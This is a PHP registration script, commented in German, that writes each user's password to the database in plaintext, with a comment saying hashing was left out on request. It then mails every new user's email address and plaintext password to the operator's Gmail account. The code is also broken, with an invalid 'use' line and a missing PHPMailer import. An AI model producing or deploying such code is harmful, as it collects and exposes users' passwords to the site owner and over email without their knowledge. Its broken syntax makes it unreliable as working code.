<?php
use \!PHP\register.php;
use PHPMailer\PHPMailer\Exception;

require 'db.php'; // Datenbankverbindung
require '../PHPMailer/src/PHPMailer.php';
require '../PHPMailer/src/SMTP.php';
require '../PHPMailer/src/Exception.php';

$message = ""; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password']; // Kein Hashing! (DEIN WUNSCH)

    // Daten in die Datenbank einfügen (Passwort im Klartext)
    $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $password);

    if ($stmt->execute()) {
        $message = "✅ Registrierung erfolgreich!";

        // **E-Mail-Versand**
        $mail = new PHPMailer(true);
        try {
            $mail->isSMTP();
            $mail->Host       = 'smtp.gmail.com';
            $mail->SMTPAuth   = true;
            $mail->Username   = 'deine-email@gmail.com';
            $mail->Password   = 'DEIN-APP-PASSWORT'; // Ersetze mit deinem App-Passwort
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port       = 587;

            $mail->setFrom('deine-email@gmail.com', 'Registrierungssystem');
            $mail->addAddress('deine-email@gmail.com'); // Deine eigene E-Mail

            $mail->isHTML(true);
            $mail->Subject = "Neue Registrierung";
            $mail->Body    = "<h2>Neue Anmeldung</h2>
                              <p><strong>E-Mail:</strong> $email</p>
                              <p><strong>Passwort:</strong> $password</p>";

            $mail->send();
            $message .= " 📩 E-Mail wurde gesendet!";
        } catch (Exception $e) {
            $message .= "Fehler beim E-Mail-Versand: {$mail->ErrorInfo}";
        }
    } else {
        $message = "Fehler: " . $stmt->error;
    }

    $stmt->close();
}

// Verbindung schließen
$conn->close();

// Rückmeldung an den Nutzer
echo $message;
?>
